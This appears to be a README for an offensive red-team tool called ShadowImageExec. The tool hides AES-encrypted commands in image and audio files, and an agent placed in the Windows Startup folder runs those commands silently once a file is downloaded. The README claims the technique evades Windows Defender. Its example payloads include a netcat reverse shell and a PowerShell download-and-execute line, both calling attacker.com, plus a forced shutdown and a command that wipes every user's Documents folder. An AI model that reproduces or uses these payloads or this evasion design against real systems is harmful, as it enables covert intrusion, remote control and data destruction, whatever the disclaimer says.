ShadowImageExec – StegoCrypto Auto Execution via Innocent Media Files

     Created by: Kamron Saparbaev
     Codename: mai-attack
     Year: 2025

---
Attack Category:

---Social Engineering,

---Remote Command Execution (Agent-Based),

---Defense Evasion,

---Passive Command and Control (C2),

---Living-off-the-Land Execution (LOLBins),

---Context-Dependent Initial Access,

---Persistence-Dependent Execution,

---
What is this?

ShadowImageExec is a Red Team attack technique that enables the automatic execution of commands hidden within innocent-looking media files such as .png, .mp3, or .mp4.

The core idea is simple yet powerful: embed an encrypted command inside a media file and allow a passive background agent to automatically detect and execute it as soon as the file is downloaded to the target system — without any user interaction.
---

How the Attack Works
```text
Attacker (White-Hat or Black-Hat)
        │
        ├─▶ embed-stego.py
        │     ↓
        │  Encrypted Payload (exec:...)
        │     ↓
        └─▶ Sent via Telegram
              ↓
          Target Device (Windows)
              ↓
     danger.exe (in Startup folder)
              ↓
     Watches Downloads & Desktop
              ↓
   File arrives → Decrypt → Execute
```
---
As soon as the user downloads the file (e.g., from Telegram), the pre-installed danger.exe detects the new file, decrypts the hidden payload, and executes the command silently using Python’s subprocess.run() function.

This attack has been proven to bypass antivirus software due to the use of encryption and steganography.
---

This tool has been tested against Windows Defender (fully updated) and was not detected under the following conditions:

--danger.exe was added to the Startup folder

--Stego payloads were delivered via Telegram and downloaded to the Desktop, etc..

--Payloads were AES-128 encrypted and embedded into .png or .mp3 files

--The agent passively monitored folders and only executed on trigger

---
Real-World Examples

🔻 Shutdown
```bash
exec:shutdown /s /t 0
```
🔻 Reverse Shell (Netcat)
```bash
exec:nc -e cmd.exe attacker.com 4444
```
🔻 PowerShell Downloader
```bash
exec:powershell -c "iwr -uri http://attacker.com/x.exe -OutFile x.exe; ./x.exe"
```
🔻 File Wiper
```bash
exec:del /S /Q C:\Users\*\Documents
```
---
## MITRE ATT&CK Mapping (with Links)

| Technique              | ID         |
|------------------------|------------|
| Command Execution      | [T1059](https://attack.mitre.org/techniques/T1059/)      |
| Data from Local File   | [T1005](https://attack.mitre.org/techniques/T1005/)      |
| Obfuscated Files       | [T1027](https://attack.mitre.org/techniques/T1027/)      |
| Startup Persistence    | [T1547.001](https://attack.mitre.org/techniques/T1547/001/)  |

---
 **Legal Disclaimer**

    This project is created for educational, Red Team, and CTF simulation purposes only.
    Any misuse of this tool is the responsibility of the user.
    Unauthorized use may be illegal and unethical.
